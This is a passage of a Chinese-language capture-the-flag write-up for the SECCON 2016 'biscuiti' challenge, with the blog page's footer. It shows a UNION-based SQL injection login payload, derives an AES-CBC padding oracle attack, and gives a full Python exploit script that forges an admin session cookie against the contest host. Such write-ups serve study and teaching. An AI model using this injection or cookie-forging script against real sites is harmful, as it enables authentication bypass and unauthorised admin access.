+<h2 id="0x01sqli">0x01 存在sqli</h2>
+<p style="max-width:100%;height:auto;">首先我们很容易看到输入的点没有任何过滤，也就意味着存在sql注入，并且登陆的时候是会触发解密过程的，而且sql注入使得我们可以通过联合注入控制查询返回的结果，这也就满足padding oracle的条件。
+比如我们输入如下的值：(这里我们看到我们的用户名长度相当长，待会儿会解释为什么要设定为这么长)</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">username=&amp;apos; union select &amp;apos;bendawangbendawangbendawang&amp;apos;,&amp;apos;bendawang&amp;password=
+</code></pre>
+<p style="max-width:100%;height:auto;">使得<code style="max-width:100%;height:auto;">password</code>为空，那么服务器会触发解密过程</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function auth($enc_password, $input) {     //`$enc_password`即使`bendawang`,而$input则为空
+    $enc_password = base64_decode($enc_password);     
+    $iv = substr($enc_password, 0, 16);
+    $c = substr($enc_password, 16);
+    #echo $c."&lt;br&gt;".$v;
+    $password = openssl_decrypt($c, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);     //解密失败，返回空。这里我们可以控制`IV`和`cipher`，存在`padding_oracle_attack`
+    return $password == $input;    //由于解密失败，空等于空，验证通过！！！
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">这样我们就能正常登陆上去，但是我们无法获取到<code style="max-width:100%;height:auto;">flag</code>，因为联合查询无法控制<code style="max-width:100%;height:auto;">$SESSION["isadmin"] = $u[&amp;apos;isadmin&amp;apos;];</code>
+但是通过上面的poc，我们能够获取到一个cookie值。</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-biscuiti-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="0x02cookie">0x02 cookie值</h2>
+<p style="max-width:100%;height:auto;">下面的函数是对cookie值的处理。</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function load_session() {
+    global $SESSION;
+    if (!isset($_COOKIE["JSESSION"]))
+        return array();
+    $u = base64_decode($_COOKIE["JSESSION"]);
+    $j = substr($u, 0, -16);
+    $t = substr($u, -16);
+    if (mac($j) !== $t)
+        return array(2);
+    $SESSION = unserialize($j);
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">根据<code style="max-width:100%;height:auto;">0x01</code>我们拿到的一个<code style="max-width:100%;height:auto;">cookie</code>，base64解码后如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">a:2:{s:4:"name";s:27:"bendawangbendawangbendawang";s:7:"isadmin";N;}F
+ÐÜG6Rçè
+</code></pre>
+<p style="max-width:100%;height:auto;">我们已知的cookie值的格式</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">$j = serialize($SESSION)
+JSESSION =base64_encode( $j || MAC($j) )
+</code></pre>
+<h2 id="0x03">0x03 开始搞事</h2>
+<p style="max-width:100%;height:auto;">现在，我们的目的已经明确了，我们是没有办法获取到密钥的，所以这也就决定了我们只能通过另一种方式修改cookie的值然后提交，使得验证通过并且使<code style="max-width:100%;height:auto;">$SESSION[&amp;apos;isadmin&amp;apos;]=1</code>。
+首先我们已知什么，已知AES加密的时候块的大小N=16。
+我们有一个cookie值，即我们知道全部的明文串，还有最后一块明文被加密的到的密文块
+先把明文分块如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">P0：a:2:{s:4:"name";     ----&gt; C0
+P1：s:27:"bendawangb     ----&gt; C1
+P2：endawangbendawan     ----&gt; C2
+P3：g";s:7:"isadmin"     ----&gt; C3
+P4：;N;}                 ----&gt; C4 （已知，cookie的末16位）
+</code></pre>
+<p style="max-width:100%;height:auto;">如上如所示，我们已知一块的密文，加上所有的明文，我们可以通过<code style="max-width:100%;height:auto;">padding_oracle</code>恢复所有的密文块，由于sql注入点，我们可控，既可以控制被解密的字符串。</p>
+<blockquote>
+<p style="max-width:100%;height:auto;">这里不讲padding<em>oracle的具体原理了，需要的童鞋可以看我写的另一篇blog：http://blog.csdn.net/qq</em>19876131/article/details/52674589
+  所以我们可以利用那里进行<code style="max-width:100%;height:auto;">padding_oracle_attack</code>，然后以能否成功登陆判断是否解密成功(PS:输入的<code style="max-width:100%;height:auto;">password</code>要为空)，如果解密失败，就能登陆成功，否则登录失败。
+  这样我们有了全部的密文块。
+  相当于我们已知了全部的<code style="max-width:100%;height:auto;">P0-P4</code>和<code style="max-width:100%;height:auto;">C0-C4</code>
+  现在进入到重头戏。
+  怎么要使<code style="max-width:100%;height:auto;">P4</code>的值从<code style="max-width:100%;height:auto;">P4 = ";N;}"</code>变成<code style="max-width:100%;height:auto;">P4&amp;apos; = ";b:1;}"</code>，并且修改<code style="max-width:100%;height:auto;">C4</code>为多少的时候，使其能够正常解密，从而反序列化之后<code style="max-width:100%;height:auto;">$SESSION[&amp;apos;isadmin&amp;apos;]=1</code>。</p>
+</blockquote>
+<p style="max-width:100%;height:auto;">先来看看我们的<code style="max-width:100%;height:auto;">P2</code>，不知道大家看出来没有，整个<code style="max-width:100%;height:auto;">P2</code>块都是原序列化字符串里面的字符串格式的东西，这也就解释了我们为什么最初登陆的时候用户名要相当长才行。这样子我们的<code style="max-width:100%;height:auto;">P2</code>我们可以随便修改，只要最后能够正常解密，那么它都不会影响反序列化的结果。
+这里我们先修改<code style="max-width:100%;height:auto;">P2</code>的值如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">P2&amp;apos; = P4&amp;apos; ^ C3 ^ C1     //待会就知道为什么会修改成这个值
+</code></pre>
+<p style="max-width:100%;height:auto;">然后我们保持其他地方都不变的话，然后重新发送请求得到新的<code style="max-width:100%;height:auto;">cookie</code>值，同样通过<code style="max-width:100%;height:auto;">padding_oracle</code>我们能够恢复出新的<code style="max-width:100%;height:auto;">C2’</code>，我们也很容易能够看出来，用新的<code style="max-width:100%;height:auto;">P2&amp;apos;</code>加密，但是<code style="max-width:100%;height:auto;">C0</code>和<code style="max-width:100%;height:auto;">C1</code>是不会变化的，我们来看看我们一值<code style="max-width:100%;height:auto;">C2’</code>的值是怎么得来的</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">由于是CBC模式
+C2&amp;apos; = Encrypto( P2&amp;apos; ^ C1 )
+由上已知
+P2&amp;apos; = P4&amp;apos; ^ C3 ^ C1
+所以
+C2&amp;apos; = Encrypto( P2&amp;apos; ^ C1 )
+    = Encrypto(P4&amp;apos; ^ C3 ^ C1 ^ C1)
+    = Encrypto(P4&amp;apos; ^ C3 )
+</code></pre>
+<p style="max-width:100%;height:auto;">有了上面的式子，我们再重新来，这次不修改<code style="max-width:100%;height:auto;">P2</code>了，这次我们只修改<code style="max-width:100%;height:auto;">P4</code>为<code style="max-width:100%;height:auto;">P4&amp;apos;</code></p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">由于是CBC模式
+C4&amp;apos;=Encrypto( P4&amp;apos; ^ C3 )=C2&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">所以这就出来了，我们只修改<code style="max-width:100%;height:auto;">P4</code>对应新的C4’和只修改<code style="max-width:100%;height:auto;">P2</code>恢复出的<code style="max-width:100%;height:auto;">C2&amp;apos;</code>是相等的，那么这就搞定了。</p>
+<h2 id="0x04">0x04 代码</h2>
+<p style="max-width:100%;height:auto;">就剩写代码，下面附上我自己写的代码，写的很挫，而且中间犯了各式各样奇奇怪怪的错误，还是自己的代码习惯太差了，慢慢改正把</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;"># encoding:utf-8
+import requests
+import base64
+url=&amp;apos;http://biscuiti.pwn.seccon.jp/&amp;apos;
+N=16
+def inject(password):
+    param={&amp;apos;username&amp;apos;:"&amp;apos; union select &amp;apos;bendawangbendawangbendawang&amp;apos;,&amp;apos;{password}".format(password=password),&amp;apos;password&amp;apos;:&amp;apos;&amp;apos;}
+    result=requests.post(url,data=param)
+    return result
+def xor(a, b):
+    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
+def pad(string,N):
+    l=len(string)
+    if l!=N:
+        return string+chr(N-l)*(N-l)
+def padding_oracle(N,cipher,plaintext):
+    get=""
+    for i in xrange(1,N+1):
+        for j in xrange(0,256):
+            padding=xor(get,chr(i)*(i-1))
+            c=&amp;apos;a&amp;apos;*(16-i)+chr(j)+padding+cipher
+            result=inject(base64.b64encode(chr(0)*16+c))
+            if "Hello" not in result.content:
+                get=chr(j^i)+get
+                print get.encode(&amp;apos;hex&amp;apos;)
+                break
+    return xor(get,plaintext)
+
+jsession=inject("bendawang").headers[&amp;apos;set-cookie&amp;apos;].split(&amp;apos;=&amp;apos;)[1].replace("%3D",&amp;apos;=&amp;apos;).replace("%2F",&amp;apos;/&amp;apos;).replace("%2B",&amp;apos;+&amp;apos;).decode(&amp;apos;base64&amp;apos;)
+serialize=jsession[:-16]
+print serialize
+p=[]
+for i in xrange(0,len(serialize),16):
+    p.append(serialize[i:i+16])
+l=len(p)
+p[l-1]=pad(p[l-1],N)
+c=[""]*l
+c[l-1]=jsession[-16:]
+for i in xrange(l-1,0,-1):
+    c[i-1]=padding_oracle(N,c[i],p[i])
+#c=[&amp;apos;\x88\xbb|I1e\x1c\xb9u\xe4\x8e\x90\x08\xc1\xa9\x11&amp;apos;, &amp;apos;sd\x0c2\x13i\xac\xfd\x16\x9e\xa8\xc5?\x07/\xe5&amp;apos;, &amp;apos;&gt;\xbfZX\xda\x10\x99^\xd9\xa3\x15\xa9\\Q-\x9e&amp;apos;, &amp;apos;\xf5;\xc6\x1cn\x0f\xe5\x1bJ{\x08\x00\xbd\x8d\x17\x18&amp;apos;, &amp;apos;\xd0PP\xbfK\x8b:\x12\xaa\xa8Et\x83\x12T\xe7&amp;apos;]
+p[4]=pad(&amp;apos;;b:1;}&amp;apos;,N)
+p[2]=xor(xor(c[3],p[4]),c[1])
+param={&amp;apos;username&amp;apos;:"&amp;apos; union select &amp;apos;bendawangb{new_p}g&amp;apos;,&amp;apos;bendawang".format(new_p=p[2]),&amp;apos;password&amp;apos;:&amp;apos;&amp;apos;}
+result=requests.post(url,data=param)
+#print p
+jsession=result.headers[&amp;apos;set-cookie&amp;apos;].split(&amp;apos;=&amp;apos;)[1].replace("%3D",&amp;apos;=&amp;apos;).replace("%2F",&amp;apos;/&amp;apos;).replace("%2B",&amp;apos;+&amp;apos;).decode(&amp;apos;base64&amp;apos;)
+print c
+c=[""]*l
+serialize=jsession[:-16]
+p=[]
+for i in xrange(0,len(serialize),16):
+    p.append(serialize[i:i+16])
+#print p
+p[l-1]=pad(p[l-1],N)
+c[l-1]=jsession[-16:]
+for i in xrange(l-1,1,-1):
+    c[i-1]=padding_oracle(N,c[i],p[i])
+print c
+new_jsession=base64.b64encode(&amp;apos;a:2:{s:4:"name";s:27:"bendawangbendawangbendawang";s:7:"isadmin";b:1;}&amp;apos;+c[2])
+header = {"Cookie":"JSESSION="+new_jsession}
+r = requests.post(url, headers=header)
+print r.content
+</code></pre>
+<p style="max-width:100%;height:auto;">运行截图如下：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-biscuiti-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./Seccon-CTF-2016-biscuiti-writeup/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./Seccon-CTF-2016-biscuiti-writeup/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./Seccon-CTF-2016-biscuiti-writeup/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./Seccon-CTF-2016-biscuiti-writeup/prism.js"></script>
+<script src="./Seccon-CTF-2016-biscuiti-writeup/zooming.js"></script>
+<script src="./Seccon-CTF-2016-biscuiti-writeup/Bendawang.js"></script>
+
+
